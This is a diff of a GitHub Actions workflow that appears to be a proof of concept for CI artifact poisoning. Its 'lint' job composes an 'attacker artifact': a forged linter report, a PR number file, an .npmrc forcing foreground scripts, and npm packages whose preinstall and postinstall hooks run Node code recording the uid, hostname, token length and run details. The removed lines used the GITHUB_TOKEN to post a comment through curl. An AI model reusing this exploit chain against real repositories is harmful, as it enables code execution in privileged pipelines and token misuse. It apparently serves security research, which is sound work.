@@ -10,51 +10,36 @@ jobs:
   lint:
     runs-on: ubuntu-latest
     steps:
-      - name: Build attacker-controlled artifact
+      - name: Compose attacker artifact
         run: |
           mkdir -p out/evil
           printf 'FORGED linter report (attacker supplied)\n' > out/linter-report.txt
           echo "${{ github.event.pull_request.number }}" > out/pr-number.txt
           cat > out/package.json <<'PKG'
           {
-            "name": "gab-poc-root",
+            "name": "gab-verify-root",
             "version": "1.0.0",
             "private": true,
-            "dependencies": { "gab-poc-local-evil": "file:./evil" }
+            "scripts": { "preinstall": "node preinstall.js" },
+            "dependencies": { "gab-verify-evil": "file:./evil" }
           }
           PKG
-          cat > out/evil/package.json <<'PKG'
-          { "name": "gab-poc-local-evil", "version": "1.0.0", "scripts": { "postinstall": "node hook.js" } }
-          PKG
-          printf 'foreground-scripts=true\n' > out/.npmrc
-          cat > out/evil/hook.js <<'JS'
-          const fs = require('fs');
-          const os = require('os');
-          const root = process.env.INIT_CWD || process.cwd();
-          const tok = process.env.GITHUB_TOKEN || '';
-          const repo = process.env.GITHUB_REPOSITORY || '';
-          let pr = '0';
-          try { pr = fs.readFileSync(root + '/pr-number.txt', 'utf8').trim(); } catch (e) {}
-          const line = 'GAB_RCE_EXECUTED uid=' + (process.getuid ? process.getuid() : 'n/a') +
-            ' host=' + os.hostname() + ' token_len=' + tok.length +
-            ' repo=' + repo + ' run=' + process.env.GITHUB_RUN_ID +
-            ' event=' + process.env.GITHUB_EVENT_NAME;
-          fs.writeFileSync(root + '/GAB_RCE_MARKER.txt', line + '\n');
+          cat > out/preinstall.js <<'JS'
+          const fs=require('fs'),os=require('os');
+          const line='PREINSTALL_RCE uid='+(process.getuid?process.getuid():'n/a')+' host='+os.hostname()+' token_len='+(process.env.GITHUB_TOKEN||'').length+' event='+process.env.GITHUB_EVENT_NAME+' run='+process.env.GITHUB_RUN_ID;
+          fs.appendFileSync('evidence.txt', line+'\n');
           console.log(line);
-          if (tok && repo && /^[0-9]+$/.test(pr)) {
-            const body = JSON.stringify({ body: 'GAB PoC hook ran: ' + line });
-            try {
-              const out = require('child_process').execSync(
-                'curl -sS -o /tmp/ghresp -w "%{http_code}" --max-time 20 -X POST ' +
-                '-H "Authorization: Bearer ' + tok + '" -H "Accept: application/vnd.github+json" ' +
-                '-H "Content-Type: application/json" ' +
-                '"https://api.github.com/repos/' + repo + '/issues/' + pr + '/comments" ' +
-                '-d ' + JSON.stringify(body),
-                { timeout: 25000 }).toString();
-              console.log('COMMENT_HTTP=' + out);
-            } catch (e) { console.log('COMMENT_ERR=' + e.message); }
-          }
           JS
+          cat > out/evil/package.json <<'PKG'
+          {"name":"gab-verify-evil","version":"1.0.0","scripts":{"postinstall":"node hook.js"}}
+          PKG
+          cat > out/evil/hook.js <<'JS'
+          const fs=require('fs'),os=require('os');
+          const line='POSTINSTALL_RCE uid='+(process.getuid?process.getuid():'n/a')+' token_len='+(process.env.GITHUB_TOKEN||'').length+' event='+process.env.GITHUB_EVENT_NAME;
+          fs.appendFileSync('evidence.txt', line+'\n');
+          console.log(line);
+          JS
+          printf 'foreground-scripts=true\n' > out/.npmrc
       - name: Upload linter report
         uses: actions/upload-artifact@v7
         with:
